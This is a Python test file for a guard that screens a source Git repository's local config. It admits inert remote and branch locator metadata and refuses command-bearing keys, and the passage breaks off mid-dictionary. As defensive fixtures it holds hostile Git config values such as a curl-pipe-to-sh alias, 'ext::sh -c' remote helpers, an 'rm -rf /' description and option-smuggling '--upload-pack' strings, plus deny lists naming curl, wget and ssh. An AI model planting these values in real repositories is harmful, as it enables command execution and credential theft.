"""Source-side inert remote/branch Git metadata: acceptance and its exact bounds.

The source repository and the materialized target workspace are separate trust
boundaries.  An ordinary developer clone records where it came from; that
locator metadata is inert -- it cannot run a command, redirect a hook, install a
filter or credential helper, or make the read-only source preflight contact
anything.  These tests pin the four admitted key families, every refused
sibling, the value policy, the fact that Git's own parser (not raw text) is the
decision authority, and the unchanged no-remote law on the target workspace.
"""

from __future__ import annotations

import os
from pathlib import Path
import shutil
import socket
import subprocess

import pytest

import admissible.delegated_gate.native_canary as native_canary_module

from admissible.delegated_gate.mission_profile import (
    GitEndStatePolicy,
    MISSION_PROFILE_SCHEMA_VERSION_V2,
    RuntimePromptAuthority,
    VerificationAuthority,
    VerificationMode,
    WorkspaceSourceAuthority,
    WorkspaceSourceKind,
    create_native_mission_profile,
)
from admissible.delegated_gate.models import EvidenceKind
from admissible.delegated_gate.native_canary import (
    NativeEvidenceInvalid,
    _git_source_preflight,
    _inspect_local_git_metadata,
    _materialize_local_repository_copy,
    _observe_local_repository_source,
)
from admissible.delegated_gate.native_executor import (
    _HARDENED_GIT_ENVIRONMENT,
    _hardened_git_environment,
)


AGENT_OS_ORIGIN_URL = "https://github.com/Camarade-dev/agent-os.git"
STANDARD_FETCH_REFSPEC = "+refs/heads/*:refs/remotes/origin/*"


# --------------------------------------------------------------------------
# fail-loud network / provider observation
# --------------------------------------------------------------------------

_FORBIDDEN_GIT_VERBS = frozenset(
    {"fetch", "push", "pull", "clone", "ls-remote", "remote-https", "remote-http", "remote-ext"}
)
_PROVIDER_MARKERS = ("cursor", "cursor-agent", "claude", "ssh", "scp", "curl", "wget")


class _NetworkObservation:
    """Records every child process and fails loudly on any egress attempt."""

    def __init__(self) -> None:
        self.argv: list[tuple[str, ...]] = []

    def reset(self) -> None:
        """Discard fixture-construction calls so only the product is observed."""

        self.argv.clear()

    @property
    def git_argv(self) -> list[tuple[str, ...]]:
        return [
            argv
            for argv in self.argv
            if Path(argv[0]).name.casefold() in {"git", "git.exe"}
        ]


@pytest.fixture()
def observed_network(monkeypatch: pytest.MonkeyPatch) -> _NetworkObservation:
    observation = _NetworkObservation()
    original_popen_init = subprocess.Popen.__init__
    original_socket_init = socket.socket.__init__

    def guarded_popen_init(self, args, *rest, **keywords):
        argv = tuple(
            str(item) for item in (args if isinstance(args, (list, tuple)) else [args])
        )
        observation.argv.append(argv)
        program = Path(argv[0]).name.casefold()
        for marker in _PROVIDER_MARKERS:
            if program == marker or program == f"{marker}.exe":
                raise AssertionError(f"provider or transport invocation attempted: {argv!r}")
        if program in {"git", "git.exe"}:
            for item in argv[1:]:
                if item.casefold() in _FORBIDDEN_GIT_VERBS:
                    raise AssertionError(f"network-bearing Git invocation attempted: {argv!r}")
        return original_popen_init(self, args, *rest, **keywords)

    def guarded_socket_init(self, *rest, **keywords):
        raise AssertionError("socket creation attempted during a local-only observation")

    monkeypatch.setattr(subprocess.Popen, "__init__", guarded_popen_init)
    monkeypatch.setattr(socket.socket, "__init__", guarded_socket_init)
    return observation


# --------------------------------------------------------------------------
# external repository construction
# --------------------------------------------------------------------------


def _git(repository: Path, *arguments: str) -> subprocess.CompletedProcess[str]:
    environment = dict(os.environ)
    environment["GIT_OPTIONAL_LOCKS"] = "0"
    completed = subprocess.run(
        ["git", *arguments],
        cwd=repository,
        env=environment,
        shell=False,
        check=False,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
    )
    if completed.returncode:
        raise AssertionError(completed.stderr)
    return completed


def _external_repository(root: Path, *, branch: str = "main") -> Path:
    """A clean ordinary Git repository outside the Admissible repository."""

    root.mkdir(parents=True)
    _git(root, "init", "--quiet", f"--initial-branch={branch}")
    _git(root, "config", "user.name", "Inert Metadata Test")
    _git(root, "config", "user.email", "inert@test.invalid")
    _git(root, "config", "core.autocrlf", "false")
    (root / "README.md").write_text("inert source\n", encoding="utf-8", newline="\n")
    _git(root, "add", "README.md")
    _git(root, "commit", "--quiet", "-m", "chore: initialize inert source")
    return root.resolve()


def _configure_ordinary_origin(repository: Path, *, branch: str = "main") -> None:
    _git(repository, "config", "remote.origin.url", AGENT_OS_ORIGIN_URL)
    _git(repository, "config", "remote.origin.fetch", STANDARD_FETCH_REFSPEC)
    _git(repository, "config", f"branch.{branch}.remote", "origin")
    _git(repository, "config", f"branch.{branch}.merge", f"refs/heads/{branch}")


def _head(repository: Path) -> str:
    return _git(repository, "rev-parse", "HEAD").stdout.strip()


def _write_config(repository: Path, text: str) -> None:
    (repository / ".git" / "config").write_bytes(text.encode("utf-8"))


def _git_config_oracle(repository: Path) -> list[tuple[str, str]]:
    """Git's own parsed view of the local configuration, in file order."""

    completed = subprocess.run(
        ["git", "config", "--local", "--list", "--null"],
        cwd=repository,
        env=_hardened_git_environment(base=dict(os.environ)),
        shell=False,
        check=False,
        capture_output=True,
    )
    assert completed.returncode in {0, 1}, completed.stderr
    records = []
    for record in completed.stdout.decode("utf-8").split("\0"):
        if not record:
            continue
        key, separator, value = record.partition("\n")
        assert separator == "\n", record
        records.append((key, value))
    return records


_MINIMAL_CORE = "[core]\n\trepositoryformatversion = 0\n\tfilemode = false\n\tbare = false\n"

_HOSTILE_FRAGMENTS = (
    "sh -c",
    "curl",
    "rm -rf",
    "payload",
    "evil",
    "leak",
    "password",
    "pwned",
    "\\",
    "#",
    ";",
    '"',
    "'",
    "!",
)


def _assert_no_hostile_fragment(message: str) -> None:
    """Owner-facing refusals stay bounded and free of attacker-chosen text."""

    assert len(message) <= 200, message
    for fragment in _HOSTILE_FRAGMENTS:
        assert fragment not in message, message


# --------------------------------------------------------------------------
# H. positive source-preflight behavior
# --------------------------------------------------------------------------


def test_source_preflight_accepts_inert_remote_and_branch_metadata(
    tmp_path: Path, observed_network: _NetworkObservation
):
    repository = _external_repository(tmp_path / "inert-source")
    _configure_ordinary_origin(repository)
    head = _head(repository)

    assert _git_config_oracle(repository)[-4:] == [
        ("remote.origin.url", AGENT_OS_ORIGIN_URL),
        ("remote.origin.fetch", STANDARD_FETCH_REFSPEC),
        ("branch.main.remote", "origin"),
        ("branch.main.merge", "refs/heads/main"),
    ]

    observed_network.reset()
    ready, detail = _git_source_preflight(repository, head)
    assert (ready, detail) == (True, "clean authorized source HEAD confirmed")

    # The exact HEAD is still verified.
    assert _git_source_preflight(repository, "0" * 40) == (
        False,
        "source HEAD does not match the explicitly authorized source HEAD",
    )

    # The source is observed twice without drift.
    first = _observe_local_repository_source(repository)
    second = _observe_local_repository_source(repository)
    assert first == second
    assert first.remotes == (
        f"origin\t{AGENT_OS_ORIGIN_URL} (fetch)",
        f"origin\t{AGENT_OS_ORIGIN_URL} (push)",
    )

    # Cleanliness is still required.
    (repository / "README.md").write_text("dirtied\n", encoding="utf-8", newline="\n")
    assert _git_source_preflight(repository, head) == (False, "source repository is not clean")

    # J. no network, no transport helper, no provider.
    assert observed_network.git_argv
    for argv in observed_network.git_argv:
        assert not (_FORBIDDEN_GIT_VERBS & {item.casefold() for item in argv[1:]}), argv


def test_source_preflight_accepts_configuration_matching_this_repository(
    tmp_path: Path, observed_network: _NetworkObservation
):
    """A clean external repository carrying this repository's exact key set.

    Honest skip when the installed package tree is not itself a Git work tree
    (an exported copy, a wheel install, an external mutation harness).  The
    same invariant is covered without the live repository by
    ``test_source_preflight_accepts_inert_remote_and_branch_metadata``, which
    configures the identical origin URL, refspec and branch metadata.
    """

    admissible_root = Path(native_canary_module.__file__).resolve().parents[2]
    if not (admissible_root / ".git").is_dir():
        pytest.skip("package tree is not a Git work tree")

    live_keys = [key for key, _ in _git_config_oracle(admissible_root)]
    assert "remote.origin.url" in live_keys

    repository = _external_repository(tmp_path / "agent-os-like", branch="master")
    _configure_ordinary_origin(repository, branch="master")
    for key, value in _git_config_oracle(admissible_root):
        if key.startswith(("remote.", "branch.")):
            _git(repository, "config", "--replace-all", key, value)

    replicated = {key for key, _ in _git_config_oracle(repository)}
    assert {key for key in live_keys if key.startswith(("remote.", "branch."))} <= replicated

    ready, detail = _git_source_preflight(repository, _head(repository))
    assert (ready, detail) == (True, "clean authorized source HEAD confirmed")
    assert observed_network.git_argv


@pytest.mark.parametrize(
    ("key", "value"),
    (
        ("remote.origin.url", AGENT_OS_ORIGIN_URL),
        ("remote.origin.url", "https://example.invalid/repo.git"),
        ("remote.upstream.url", "git@example.invalid:owner/repo.git"),
        ("remote.origin.fetch", STANDARD_FETCH_REFSPEC),
        ("remote.origin.fetch", "+refs/heads/main:refs/remotes/origin/main"),
        ("remote.origin.fetch", "refs/heads/*:refs/remotes/origin/*"),
        ("branch.main.remote", "origin"),
        ("branch.main.remote", "."),
        ("branch.master.merge", "refs/heads/master"),
        ("branch.main.merge", "refs/heads/main"),
    ),
)
def test_individual_inert_family_values_are_accepted(tmp_path: Path, key: str, value: str):
    repository = _external_repository(tmp_path / "accepted")
    _git(repository, "config", key, value)
    assert (key, value) in _git_config_oracle(repository)
    _inspect_local_git_metadata(repository)


# --------------------------------------------------------------------------
# C / F. exact key-family matching -- every sibling stays refused
# --------------------------------------------------------------------------

_REFUSED_KEYS = (
    ("remote.origin.pushurl", "https://example.invalid/repo.git"),
    ("remote.origin.uploadpack", "evil-uploadpack"),
    ("remote.origin.receivepack", "evil-receivepack"),
    ("remote.origin.proxy", "http://example.invalid:8080"),
    ("remote.origin.vcs", "hg"),
    ("remote.origin.mirror", "true"),
    ("remote.origin.tagopt", "--no-tags"),
    ("remote.origin.prune", "true"),
    ("remote.origin.partialclonefilter", "blob:none"),
    ("branch.master.rebase", "true"),
    ("branch.master.description", "hostile-branch-description"),
    ("branch.master.pushRemote", "origin"),
    ("branch.master.updateRefs", "true"),
    ("url.https://example.invalid/.insteadOf", "https://real.invalid/"),
    ("url.https://example.invalid/.pushInsteadOf", "https://real.invalid/"),
    ("include.path", "../../owner-controlled.gitconfig"),
    ("includeIf.gitdir:/repos/.path", "../../owner-controlled.gitconfig"),
    ("alias.anything", "log --oneline"),
    ("filter.demo.clean", "evil-clean"),
    ("filter.demo.smudge", "evil-smudge"),
    ("filter.demo.process", "evil-process"),
    ("credential.helper", "evil-helper"),
    ("credential.https://example.invalid.helper", "evil-helper"),
    ("core.hooksPath", "../../owner-hooks"),
    ("core.fsmonitor", "evil-fsmonitor.cmd"),
    ("core.sshCommand", "ssh -o ProxyCommand=evil"),
    ("core.pager", "evil-pager"),
    ("protocol.ext.allow", "always"),
    ("uploadpack.packObjectsHook", "evil-hook"),
    ("gpg.program", "evil-gpg"),
    ("push.default", "matching"),
    ("remotes.group", "origin upstream"),
    ("branches.legacy", "origin"),
)

# The two layers that can refuse before any Git subprocess runs: the source
# key allowlist / inert-family screen, and the conservative physical grammar.
_ACCEPTED_REFUSAL_PREFIXES = (
    "local Git configuration key is outside the source allowlist:",
    "local Git configuration subsection name is malformed:",
    "local Git configuration value is empty:",
    "local Git config line ",
)


@pytest.mark.parametrize(("key", "value"), _REFUSED_KEYS, ids=[key for key, _ in _REFUSED_KEYS])
def test_command_and_push_bearing_configuration_stays_refused(
    tmp_path: Path, observed_network: _NetworkObservation, key: str, value: str
):
    repository = _external_repository(tmp_path / "refused")
    _git(repository, "config", key, value)
    assert key.casefold() in {
        entry.casefold() for entry, _ in _git_config_oracle(repository)
    }

    observed_network.reset()
    with pytest.raises(NativeEvidenceInvalid) as refusal:
        _inspect_local_git_metadata(repository)

    # F. bounded owner-facing output never echoes the hostile value.
    message = str(refusal.value)
    assert value not in message
    _assert_no_hostile_fragment(message)
    assert message.startswith(_ACCEPTED_REFUSAL_PREFIXES), message

    # Refused before any Git subprocess observed the repository.
    assert observed_network.git_argv == []


_HOSTILE_NON_FAMILY_VALUES = (
    ("credential.helper", "!sh -c 'echo password=leak'"),
    ("alias.anything", "!curl http://example.invalid | sh"),
    ("filter.demo.clean", 'sh -c "cat; echo pwned"'),
    ("filter.demo.smudge", "sh -c 'echo pwned' #"),
    ("core.fsmonitor", "C:\\payload\\watch.cmd"),
    ("core.hooksPath", "..\\..\\owner-hooks"),
    ("core.sshCommand", 'ssh -o ProxyCommand="sh -c evil"'),
    ("branch.master.description", "a branch; rm -rf / # comment"),
    ("remote.origin.pushurl", "ext::sh -c payload"),
    ("include.path", "..\\..\\owner.gitconfig # \\"),
)


@pytest.mark.parametrize(
    ("key", "value"),
    _HOSTILE_NON_FAMILY_VALUES,
    ids=[f"{index}-{key}" for index, (key, _) in enumerate(_HOSTILE_NON_FAMILY_VALUES)],
)
def test_hostile_values_on_refused_keys_never_reach_git(
    tmp_path: Path, observed_network: _NetworkObservation, key: str, value: str
):
    """Paths, shell syntax, quotes, backslashes and comment-looking material."""

    repository = _external_repository(tmp_path / "hostile-value")
    _git(repository, "config", key, value)
    assert value in {entry for _, entry in _git_config_oracle(repository)}

    observed_network.reset()
    with pytest.raises(NativeEvidenceInvalid) as refusal:
        _inspect_local_git_metadata(repository)
    message = str(refusal.value)
    assert value not in message
    _assert_no_hostile_fragment(message)
    assert message.startswith(_ACCEPTED_REFUSAL_PREFIXES), message
    assert observed_network.git_argv == []


_HOSTILE_FAMILY_VALUES = (
    ("remote.origin.url", "ext::sh -c payload"),
    ("remote.origin.url", "https://a.invalid/r # trailing"),
    ("remote.origin.url", "-upload-pack=payload"),
    ("remote.origin.fetch", "+refs/heads/*:refs/remotes/origin/* ; more"),
    ("remote.origin.fetch", "sh -c payload"),
    ("branch.master.merge", "refs/heads/master\\"),
    ("branch.master.merge", "--upload-pack=payload"),
    ("branch.master.remote", "-origin"),
)


@pytest.mark.parametrize(
    ("key", "value"),
    _HOSTILE_FAMILY_VALUES,
    ids=[f"{index}-{key}" for index, (key, _) in enumerate(_HOSTILE_FAMILY_VALUES)],
)
def test_hostile_values_on_allowed_family_keys_are_refused_by_the_value_policy(
    tmp_path: Path, observed_network: _NetworkObservation, key: str, value: str
):
    """An admitted key family never admits a hostile value."""

    repository = _external_repository(tmp_path / "hostile-family-value")
    _git(repository, "config", key, value)
    assert value in {entry for _, entry in _git_config_oracle(repository)}

    observed_network.reset()
    with pytest.raises(NativeEvidenceInvalid) as refusal:
        _inspect_local_git_metadata(repository)
    message = str(refusal.value)
    assert value not in message
    _assert_no_hostile_fragment(message)
    # Whatever the layer, nothing contacted the remote.
    for argv in observed_network.git_argv:
        assert not (_FORBIDDEN_GIT_VERBS & {item.casefold() for item in argv[1:]}), argv
        assert value not in argv, argv


@pytest.mark.parametrize(
    "subsection",
    (
        "",
        " ",
        "origin ",
        " origin",
        "a\tb",
        "with\x01control",
        "way-too-long" * 40,
    ),
)
def test_malformed_subsection_names_are_refused(tmp_path: Path, subsection: str):
    repository = _external_repository(tmp_path / "malformed-subsection")
    _write_config(repository, _MINIMAL_CORE + f'[remote "{subsection}"]\n\turl = https://a.invalid/r\n')
    with pytest.raises(NativeEvidenceInvalid) as refusal:
        _inspect_local_git_metadata(repository)
    _assert_no_hostile_fragment(str(refusal.value))


# --------------------------------------------------------------------------
# D / E. remote URL and fetch/branch value policy
# --------------------------------------------------------------------------

_REFUSED_VALUES = (
    ("remote-helper-ext", "remote.origin.url", "ext::sh -c payload"),
    ("remote-helper-any", "remote.origin.url", "transport::address"),
    ("url-option-like", "remote.origin.url", "-upload-pack=payload"),
    ("url-empty", "remote.origin.url", ""),
    ("url-whitespace", "remote.origin.url", "   "),
    ("url-control", "remote.origin.url", "https://a.invalid/\x07repo"),
    ("url-newline", "remote.origin.url", "https://a.invalid/repo\nfetch = +x:y"),
    ("url-carriage-return", "remote.origin.url", "https://a.invalid/repo\rmore"),
    ("fetch-empty", "remote.origin.fetch", ""),
    ("fetch-whitespace", "remote.origin.fetch", "  \t "),
    ("fetch-no-destination", "remote.origin.fetch", "+refs/heads/*"),
    ("fetch-relative-destination", "remote.origin.fetch", "+refs/heads/*:not-a-ref/*"),
    ("fetch-star-asymmetry", "remote.origin.fetch", "+refs/heads/*:refs/remotes/origin/main"),
    ("fetch-double-star", "remote.origin.fetch", "+refs/heads/*/*:refs/remotes/origin/*/*"),
    ("fetch-malformed-ref", "remote.origin.fetch", "+refs/heads/..:refs/remotes/origin/.."),
    ("fetch-option-like", "remote.origin.fetch", "-refs/heads/*:refs/remotes/origin/*"),
    ("fetch-command-like", "remote.origin.fetch", "sh -c payload"),
    ("fetch-control", "remote.origin.fetch", "+refs/heads/\x01:refs/remotes/origin/x"),
    ("branch-remote-empty", "branch.main.remote", ""),
    ("branch-remote-option-like", "branch.main.remote", "-origin"),
    ("branch-remote-command-like", "branch.main.remote", "sh -c payload"),
    ("branch-remote-control", "branch.main.remote", "ori\x01gin"),
    ("branch-merge-short", "branch.main.merge", "main"),
    ("branch-merge-option-like", "branch.main.merge", "--upload-pack=payload"),
    ("branch-merge-malformed", "branch.main.merge", "refs/heads/bad..name"),
    ("branch-merge-glob", "branch.main.merge", "refs/heads/*"),
    ("branch-merge-control", "branch.main.merge", "refs/heads/ma\x01in"),
    ("branch-merge-empty", "branch.main.merge", "   "),
)


@pytest.mark.parametrize(
    ("key", "value"),
    [(key, value) for _, key, value in _REFUSED_VALUES],
    ids=[name for name, _, _ in _REFUSED_VALUES],
)
def test_inert_family_value_policy_refuses_unsafe_values(tmp_path: Path, key: str, value: str):
    repository = _external_repository(tmp_path / "value-policy")
    section, subsection, name = key.split(".")
    _write_config(
        repository,
        _MINIMAL_CORE + f'[{section} "{subsection}"]\n\t{name} = "{value}"\n',
    )
    with pytest.raises(NativeEvidenceInvalid) as refusal:
        _inspect_local_git_metadata(repository)
    _assert_no_hostile_fragment(str(refusal.value))


_UNSAFE_URL_VALUES = (
    "ext::sh -c payload",
    "ext::bash -c whoami",
    "transport::address",
    "-upload-pack=payload",
    "",
    "   ",
    "\t\n",
    "https://a.invalid/\x07repo",
    "https://a.invalid/\x00repo",
    "https://a.invalid/repo\nfetch = +x:y",
    "https://a.invalid/repo\rmore",
    "https://a.invalid/repo\x1b[2J",
    "x" * 4096,
)


@pytest.mark.parametrize("value", _UNSAFE_URL_VALUES, ids=[repr(v)[:40] for v in _UNSAFE_URL_VALUES])
def test_remote_url_value_policy_refuses_unsafe_values(value: str):
    """The value policy itself, independent of the physical-grammar layer.

    The conservative pre-Git grammar independently refuses a literal control
    character in ``.git/config``; this pins the value policy that decides on
    Git's own parsed value, which is where a control character or an
    option-like locator would arrive if the grammar layer ever relaxed.
    """

    with pytest.raises(NativeEvidenceInvalid):
        native_canary_module._require_inert_remote_url(value, "remote.origin.url")


@pytest.mark.parametrize(
    "value",
    (
        AGENT_OS_ORIGIN_URL,
        "https://example.invalid/owner/repo.git",
        "git@example.invalid:owner/repo.git",
        "ssh://git@example.invalid/owner/repo.git",
        "/srv/mirrors/repo.git",
        "C:/repos/mirror.git",
    ),
)
def test_remote_url_value_policy_accepts_ordinary_inactive_locators(value: str):
    native_canary_module._require_inert_remote_url(value, "remote.origin.url")


@pytest.mark.parametrize(
    "value",
    ("", "   ", "\t", "-option", "with\x07control", "with\nnewline", "with\rreturn", "x" * 4096),
)
def test_inert_value_policy_refuses_empty_control_and_option_like(value: str):
    with pytest.raises(NativeEvidenceInvalid):
        native_canary_module._require_inert_config_value(value, "remote.origin.url")


def test_remote_url_is_never_invoked_and_no_transport_runs(
    tmp_path: Path, observed_network: _NetworkObservation
):
    repository = _external_repository(tmp_path / "never-contacted")
    _configure_ordinary_origin(repository)
    head = _head(repository)

    observed_network.reset()
    _inspect_local_git_metadata(repository)
    assert _git_source_preflight(repository, head)[0] is True

    assert observed_network.git_argv
    assert observed_network.argv == observed_network.git_argv
    for argv in observed_network.git_argv:
        verbs = {item.casefold() for item in argv[1:]}
        assert not (verbs & _FORBIDDEN_GIT_VERBS), argv
        assert AGENT_OS_ORIGIN_URL not in argv, argv
    # Every Git subprocess is a local read-only observation.
    inventory = {
        next((item for item in argv[1:] if not item.startswith("-") and item != "core.fsmonitor=false"), "")
        for argv in observed_network.git_argv
    }
    assert inventory <= {
        "config",
        "check-ref-format",
        "rev-parse",
        "rev-list",
        "status",
        "ls-files",
        "log",
        "for-each-ref",
        "remote",
        "ls-tree",
        "cat-file",
        "hash-object",
    }, inventory


# --------------------------------------------------------------------------
# B / G. Git-faithful parsing is the decision authority
# --------------------------------------------------------------------------

_QUOTED_HELPER_CONFIG = (
    _MINIMAL_CORE + '[remote "origin"]\n\turl = "ext::sh -c payload"\n'
)
_QUOTED_OPTION_CONFIG = (
    _MINIMAL_CORE + '[remote "origin"]\n\turl = "-upload-pack=payload"\n'
)


def test_git_parsed_value_not_raw_text_decides_a_quoted_remote_helper(tmp_path: Path):
    """Raw text says ``"ext::...`` (inert-looking); Git says ``ext::...``."""

    repository = _external_repository(tmp_path / "quoted-helper")
    _write_config(repository, _QUOTED_HELPER_CONFIG)

    raw = (repository / ".git" / "config").read_text(encoding="utf-8")
    assert '"ext::sh -c payload"' in raw
    assert not raw.split("url = ")[1].startswith("ext::")

    assert ("remote.origin.url", "ext::sh -c payload") in _git_config_oracle(repository)

    with pytest.raises(NativeEvidenceInvalid, match="remote helper"):
        _inspect_local_git_metadata(repository)


def test_git_parsed_value_not_raw_text_decides_a_quoted_option_like_url(tmp_path: Path):
    repository = _external_repository(tmp_path / "quoted-option")
    _write_config(repository, _QUOTED_OPTION_CONFIG)
    assert ("remote.origin.url", "-upload-pack=payload") in _git_config_oracle(repository)
    with pytest.raises(NativeEvidenceInvalid, match="option-like"):
        _inspect_local_git_metadata(repository)


_GRAMMAR_FIXTURES = (
    (
        "comment-after-value",
        _MINIMAL_CORE + '[remote "origin"]\n\turl = https://a.invalid/r # trailing\n',
        False,
    ),
    (
        "semicolon-comment-after-value",
        _MINIMAL_CORE + '[remote "origin"]\n\turl = https://a.invalid/r ; trailing\n',
        False,
    ),
    (
        "escaped-backslash",
        _MINIMAL_CORE + '[remote "origin"]\n\turl = C:\\\\repos\\\\mirror\n',
        False,
    ),
    (
        "continued-line",
        _MINIMAL_CORE + '[remote "origin"]\n\turl = https://a.invalid/\\\n\tr\n',
        False,
    ),
    (
        "quoted-value",
        _MINIMAL_CORE + '[remote "origin"]\n\turl = "https://a.invalid/r"\n',
        True,
    ),
    (
        "subsection-punctuation",
        _MINIMAL_CORE + '[remote "up-stream.two_3"]\n\turl = https://a.invalid/r\n',
        True,
    ),
    (
        "key-casing",
        _MINIMAL_CORE + '[ReMoTe "origin"]\n\tURL = https://a.invalid/r\n',
        True,
    ),
    (
        "repeated-values",
        _MINIMAL_CORE
        + '[remote "origin"]\n\turl = https://a.invalid/one\n\turl = https://a.invalid/two\n',
        True,
    ),
    (
        "repeated-values-second-hostile",
        _MINIMAL_CORE
        + '[remote "origin"]\n\turl = https://a.invalid/one\n\turl = "ext::sh -c payload"\n',
        False,
    ),
)


@pytest.mark.parametrize(
    ("config_text", "accepted"),
    [(text, accepted) for _, text, accepted in _GRAMMAR_FIXTURES],
    ids=[name for name, _, _ in _GRAMMAR_FIXTURES],
)
def test_git_grammar_fixtures_decide_against_gits_own_config_interface(
    tmp_path: Path, config_text: str, accepted: bool
):
    repository = _external_repository(tmp_path / "grammar")
    _write_config(repository, config_text)

    # The authority is what Git itself emits, not the physical text.
    oracle = _git_config_oracle(repository)
    assert oracle, "Git must be able to parse every fixture in this table"

    if accepted:
        _inspect_local_git_metadata(repository)
        remote_values = [value for key, value in oracle if key.endswith(".url")]
        assert remote_values and all(
            not value.startswith('"') and not value.endswith('"') for value in remote_values
        )
    else:
        with pytest.raises(NativeEvidenceInvalid):
            _inspect_local_git_metadata(repository)


def test_duplicate_entries_stay_visible_and_agree_with_git(tmp_path: Path):
    repository = _external_repository(tmp_path / "duplicates")
    _write_config(
        repository,
        _MINIMAL_CORE
        + '[remote "origin"]\n'
        + "\turl = https://a.invalid/one\n"
        + "\turl = https://a.invalid/two\n"
        + f"\tfetch = {STANDARD_FETCH_REFSPEC}\n"
        + f"\tfetch = {STANDARD_FETCH_REFSPEC}\n",
    )
    keys = [key for key, _ in _git_config_oracle(repository)]
    assert keys.count("remote.origin.url") == 2
    assert keys.count("remote.origin.fetch") == 2
    _inspect_local_git_metadata(repository)


def test_source_decision_refuses_when_git_disagrees_with_the_pre_git_reading(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
):
    """A pre-Git reading that drops or invents an entry cannot authorize."""

    repository = _external_repository(tmp_path / "disagreement")
    _configure_ordinary_origin(repository)
    _inspect_local_git_metadata(repository)

    original = native_canary_module._parse_local_git_config

    monkeypatch.setattr(
        native_canary_module,
        "_parse_local_git_config",
        lambda path: tuple(
            entry for entry in original(path) if entry.section.casefold() != "remote"
        ),
    )
    with pytest.raises(NativeEvidenceInvalid, match="disagrees with Git"):
        _inspect_local_git_metadata(repository)


# --------------------------------------------------------------------------
# I. target-workspace separation
# --------------------------------------------------------------------------


def _profile(repository: Path):
    return create_native_mission_profile(
        schema_version=MISSION_PROFILE_SCHEMA_VERSION_V2,
        profile_id="inert-metadata-v2",
        run_id="inert-metadata-v2-run",
        session_id="inert-metadata-v2-run",
        gate_id="inert-metadata-v2-gate",
        mission_id="inert-metadata-v2-mission",
        mission_text="Add a deterministic runtime marker and commit it exactly once.",
        gate_objective="Create the configured marker under the strict local-only contract.",
        gate_clauses=(("runtime.material", "The configured marker is present."),),
        required_evidence_kinds=(EvidenceKind.TARGET_TREE.value, EvidenceKind.GIT_STATE.value),
        checkpoint_commands=(),
        completion_conditions_text="Complete the material and Git policy, then stop.",
        budgets=(1, 1, 0, 0, 0),
        timeout_seconds=60,
        stdout_byte_limit=8192,
        stderr_byte_limit=8192,
        model="auto",
        workspace_source=WorkspaceSourceAuthority(
            kind=WorkspaceSourceKind.EXISTING_LOCAL_GIT_REPOSITORY,
            local_repository_path=str(repository.resolve()),
        ),
        git_end_state_policy=GitEndStatePolicy(
            required_commits_added=1,
            required_complete_commit_message="feat: add runtime marker",
            final_worktree_clean=True,
            final_index_clean=True,
            final_remotes_absent=True,
            required_material_paths=("README.md",),
        ),
        verification=VerificationAuthority(
            mode=VerificationMode.OBSERVED_ONLY,
            verifier_source=None,
            verifier_source_sha256=None,
            verifier_timeout_seconds=None,
            verifier_output_limit_bytes=None,
            disclose_complete_source=False,
        ),
        runtime_prompt=RuntimePromptAuthority(
            permitted_effects=("Edit and commit files only in the assigned workspace.",),
            forbidden_effects=("Do not use network, add remotes, push, deploy, or edit the source.",),
            stop_clause="Stop immediately after the exact one-commit policy passes.",
        ),
    )


def test_accepted_source_metadata_never_reaches_the_target_workspace(
    tmp_path: Path, observed_network: _NetworkObservation
):
    repository = _external_repository(tmp_path / "source-with-origin")
    _configure_ordinary_origin(repository)
    source_before = _observe_local_repository_source(repository)
    assert source_before.remotes

    destination = tmp_path / "destination"
    destination.mkdir()
    built, identity = _materialize_local_repository_copy(
        profile=_profile(repository), destination_parent=destination, repository_name="work"
    )
    target = built.repository

    assert identity.initial_git_head == source_before.head
    assert _observe_local_repository_source(repository) == source_before

    assert _git(target, "remote").stdout.strip() == ""
    assert _git(target, "remote", "-v").stdout.strip() == ""
    target_keys = {key for key, _ in _git_config_oracle(target)}
    assert not any(key.startswith(("remote.", "branch.", "url.")) for key in target_keys)
    for forbidden in (
        "remote.origin.url",
        "remote.origin.fetch",
        "remote.origin.pushurl",
        "branch.main.remote",
        "branch.main.merge",
        "push.default",
        "include.path",
        "core.sshcommand",
        "credential.helper",
    ):
        assert forbidden not in {key.casefold() for key in target_keys}

    # No inherited hooks, alternates or shared object database / index.
    assert list((target / ".git" / "hooks").iterdir()) == []
    assert not (target / ".git" / "objects" / "info" / "alternates").exists()
    assert not (target / ".git" / "objects" / "info" / "http-alternates").exists()
    assert not (target / ".git" / "commondir").exists()
    assert not (target / ".git" / "config.worktree").exists()
    assert not os.path.samefile(repository / ".git" / "objects", target / ".git" / "objects")
    assert not os.path.samefile(repository / ".git" / "index", target / ".git" / "index")
    assert (target / ".git").resolve() != (repository / ".git").resolve()

    assert _git(target, "status", "--porcelain=v1", "--untracked-files=all").stdout == ""
    assert _git(target, "diff", "--cached", "--name-only").stdout == ""
    assert observed_network.git_argv


def test_target_sanitization_refuses_a_copied_source_configuration(tmp_path: Path):
    """A target that simply keeps the source ``.git/config`` cannot be accepted."""

    repository = _external_repository(tmp_path / "copy-source-config")
    _configure_ordinary_origin(repository)
    destination = tmp_path / "destination"
    destination.mkdir()

    original_render = native_canary_module._render_target_git_config
    source_config = (repository / ".git" / "config").read_bytes()

    def copying_render(settings):
        assert original_render(settings)
        return source_config

    native_canary_module._render_target_git_config = copying_render
    try:
        with pytest.raises(NativeEvidenceInvalid):
            _materialize_local_repository_copy(
                profile=_profile(repository),
                destination_parent=destination,
                repository_name="work",
            )
    finally:
        native_canary_module._render_target_git_config = original_render


# --------------------------------------------------------------------------
# J. call contract of the Git-parser subprocess
#
# ``_git_parsed_local_configuration`` is the authorization authority for source
# configuration, so *how* it asks Git is itself a contract: the exact
# local-listing argv and an explicit hardened child environment.  Neither is
# observable from the parsed result alone, so both are pinned directly on the
# real subprocess call.
# --------------------------------------------------------------------------

_PARSER_ARGV = (
    "git",
    "-c",
    "core.fsmonitor=false",
    "--no-pager",
    "config",
    "--local",
    "--list",
    "--null",
)

# Restated deliberately rather than read back from the production constant: the
# child environment is the contract under test, so a mutant that empties or
# narrows ``_HARDENED_GIT_ENVIRONMENT`` must fail here too.  The null-device
# value is the platform-appropriate one production uses.
_REQUIRED_CHILD_GIT_ENVIRONMENT = {
    "GIT_CONFIG_NOSYSTEM": "1",
    "GIT_CONFIG_GLOBAL": "NUL" if os.name == "nt" else os.devnull,
    "GIT_OPTIONAL_LOCKS": "0",
    "GIT_TERMINAL_PROMPT": "0",
    "GIT_NO_LAZY_FETCH": "1",
    "GIT_NO_REPLACE_OBJECTS": "1",
    "GIT_PAGER": "",
    "GIT_CONFIG_COUNT": "1",
